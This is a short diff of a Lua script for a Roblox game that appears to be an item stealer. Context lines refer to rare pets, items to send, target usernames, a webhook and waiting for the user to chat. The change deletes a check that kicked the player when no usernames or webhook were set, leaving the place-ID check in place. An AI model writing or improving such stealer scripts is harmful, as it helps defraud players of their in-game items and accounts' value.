@@ -26,11 +26,6 @@ local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
 local totalValue = 0
 local itemsToSend = {}
 
-if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add any usernames or webhook")
-    return
-end
-
 if game.PlaceId ~= 126884695634066 then
     plr:kick("Game not supported. Please join a normal GAG server")
     return
@@ -372,3 +367,4 @@ if #itemsToSend > 0 then
     waitForUserChat()
 
 end
+
